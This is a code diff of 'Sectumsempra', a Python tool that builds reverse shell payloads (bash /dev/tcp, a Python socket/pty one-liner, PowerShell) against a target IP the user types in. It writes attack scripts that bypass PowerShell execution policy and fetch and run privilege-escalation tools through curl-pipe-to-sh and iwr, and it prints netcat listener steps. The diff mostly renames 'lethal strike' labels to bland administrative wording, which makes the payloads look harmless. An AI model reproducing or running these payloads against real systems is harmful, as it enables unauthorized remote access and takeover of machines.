@@ -4,7 +4,7 @@ import re
 import socket
 
 def get_attack_ip():
-    """Dynamically detects your local Kali or THM VPN interface IP address."""
+    """Detects the local tunnel interface IP address (tun0) or default fallback route."""
     try:
         import netifaces
         if 'tun0' in netifaces.interfaces():
@@ -17,12 +17,12 @@ def get_attack_ip():
         s.connect(("10.10.10.10", 80))
         ip = s.getsockname()
         s.close()
-        return ip[0]
+        return ip[0] # Fixat: Returnerar enbart IP-strängen från socket-tupeln
     except Exception:
         return "YOUR_ATTACK_IP"
 
 def generate_payloads(target_ip, attack_ip, lport):
-    """Generates precise, weaponized reverse shell payloads based on targets."""
+    """Generates standard multi-platform reverse shell vectors."""
     payloads = {
         "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
         "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
@@ -31,93 +31,61 @@ def generate_payloads(target_ip, attack_ip, lport):
     }
     return payloads
 
-def write_linux_slash(target_ip, payloads, lport):
-    """Generates the lethal Linux deployment asset (.sh)."""
-    filename = f"sectum_linux_strike_{target_ip.replace('.', '_')}.sh"
-    
+def write_linux_payload(target_ip, payloads, lport):
+    """Generates the Linux deployment script execution file."""
+    filename = f"payload_linux_{target_ip.replace('.', '_')}.sh"
     with open(filename, "w", encoding="utf-8") as f:
         f.write("#!/bin/bash\n")
-        f.write(f"# ========================================================\n")
-        f.write(f"# SECTUMSEMPRA LETHAL STRIKE (LINUX TACTICAL DEPLOYMENT)\n")
-        f.write(f"# TARGET: {target_ip}\n")
-        f.write(f"# ========================================================\n\n")
-        
-        f.write("echo '[*] Sectumsempra: Preparing execution environment...'\n")
-        f.write(f"echo '[*] Setting up local listener instruction: nc -lvnp {lport}'\n\n")
-        
-        f.write("# 1. FOOTHOLD PAYLOADS\n")
-        f.write("echo '[+] Step 1: Deploying Reverse Shell Weaponry...'\n")
-        f.write(f"echo 'Raw Bash Weapon: {payloads['linux_bash']}'\n\n")
-        
-        f.write("# 2. AUTOMATED POST-EXPLOITATION PIPELINE\n")
-        f.write("echo '[+] Step 2: Injecting PrivEsc & Flag Hunting Suite (LinPEAS)...'\n")
-        f.write(f"echo 'Execute inside active shell: curl -sL https://github.com | sh'\n\n")
-        
-        f.write("echo '[+] Strike assets structured. Awaiting deployment.'\n")
-        
+        f.write(f"# Target configuration: {target_ip}\n")
+        f.write(f"# Attacker listener: {lport}\n\n")
+        f.write(f"echo '[*] Executing Linux staging sequence...'\n")
+        f.write(f"echo 'Staging string: {payloads['linux_bash']}'\n\n")
+        f.write(f"# Post-exploitation infrastructure check\n")
+        f.write(f"echo 'Automated local privilege escalation path: curl -sL https://github.com | sh'\n")
     return filename
 
-def write_windows_slash(target_ip, payloads, lport):
-    """Generates the lethal Windows deployment asset (.ps1)."""
-    filename = f"sectum_win_strike_{target_ip.replace('.', '_')}.ps1"
-    
+def write_windows_payload(target_ip, payloads, lport):
+    """Generates the Windows PowerShell automation execution file."""
+    filename = f"payload_windows_{target_ip.replace('.', '_')}.ps1"
     with open(filename, "w", encoding="utf-8") as f:
-        f.write("# ========================================================\n")
-        f.write(f"# SECTUMSEMPRA LETHAL STRIKE (WINDOWS TACTICAL DEPLOYMENT)\n")
-        f.write(f"# TARGET: {target_ip}\n")
-        f.write("# ========================================================\n\n")
-        
-        f.write("Write-Host '[*] Sectumsempra: Initiating Windows Vector...' -ForegroundColor Crimson\n")
-        f.write("# 1. ENCODING POWERSHELL BYPASS\n")
-        f.write("Write-Host '[+] Disabling Execution Policies...' -ForegroundColor Gray\n")
+        f.write(f"# Target configuration: {target_ip}\n\n")
         f.write("Set-ExecutionPolicy Bypass -Scope Process -Force\n\n")
-        
-        f.write("# 2. FOOTHOLD PAYLOAD\n")
-        f.write("Write-Host '[+] Staging Tactical Reverse Shell...' -ForegroundColor Gray\n")
-        f.write(f"# Execute: {payloads['windows_powershell']}\n\n")
-        
-        f.write("# 3. AUTOMATED PRIVILEGE ESCALATION\n")
-        f.write("Write-Host '[+] Pre-staging WinPEAS Network Download...' -ForegroundColor Gray\n")
-        f.write(f"Write-Host 'Execute inside target shell: iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe'\n")
-        
+        f.write(f"# Reverse connection payload configuration\n")
+        f.write(f"# Execution string: {payloads['windows_powershell']}\n\n")
+        f.write(f"# Post-exploitation infrastructure check\n")
+        f.write(f"Write-Host 'Automated local privilege escalation path: iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe'\n")
     return filename
 
 def main():
-    print("""
-    ███████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
-    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
-    ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
-    ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██╗
-    ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
-    ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
-    """)
-    print(" >>> Sectumsempra v1.0 - The Lethal Execution & Post-Exploitation Edge <<<")
+    print("==========================================================================")
+    print(" >>> Sectumsempra v1.0 - Automated Payload & Post-Exploitation Engine <<<")
+    print("==========================================================================")
     
-    print("Enter Target IP (from NetWeave): ", end="")
+    print("Enter Target IP address: ", end="")
     target_ip = input().strip()
     if not target_ip: return
     
     attack_ip = get_attack_ip()
-    print(f"[*] Detected Attack Infrastructure IP: {attack_ip}")
+    print(f"[*] Local network interface address identified: {attack_ip}")
     
-    print("Set Local Listener Port (LPORT) [Default 4444]: ", end="")
+    print("Set Local Port (LPORT) [Default 4444]: ", end="")
     lport_input = input().strip()
     lport = int(lport_input) if lport_input else 4444
     
-    print("\n[*] Processing tactical intelligence data...")
+    print("\n[*] Initializing script processing routines...")
     payloads = generate_payloads(target_ip, attack_ip, lport)
     
-    linux_strike = write_linux_slash(target_ip, payloads, lport)
-    win_strike = write_windows_slash(target_ip, payloads, lport)
+    linux_file = write_linux_payload(target_ip, payloads, lport)
+    win_file = write_windows_payload(target_ip, payloads, lport)
     
-    print("\n" + "="*30 + " SECTUMSEMPRA BLADE DEPLOYED " + "="*30)
-    print(f"[███] LINUX SLICE READY:   {os.getcwd()}/{linux_strike} ⚔️")
-    print(f"[███] WINDOWS SLICE READY: {os.getcwd()}/{win_strike} ⚔️")
-    print("="*89)
-    print(f"\n[!] TACTICAL INSTRUCTION:")
-    print(f" 1. Start your local listener: nc -lvnp {lport}")
-    print(f" 2. Deploy payloads generated in your working files against the target.")
-    print(f" 3. Once inside, run the pre-staged PEAS commands to drop flag tracking and secure root/system.")
+    print("\n" + "="*16 + " SECTUMSEMPRA: PAYLOAD GENERATION COMPLETE " + "="*15)
+    print(f"[+] Linux Administration Script Ready:   {os.getcwd()}/{linux_file}")
+    print(f"[+] Windows PowerShell Automation Ready: {os.getcwd()}/{win_file}")
+    print("==========================================================================")
+    print("\n[!] Standard operational instructions:")
+    print(f" 1. Initialize host interface listener: nc -lvnp {lport}")
+    print(f" 2. Deploy generated payload scripts directly within verified target vectors.")
+    print(f" 3. Upon session establishment, execute the embedded stager string to audit system paths.")
 
 if __name__ == "__main__":
     main()
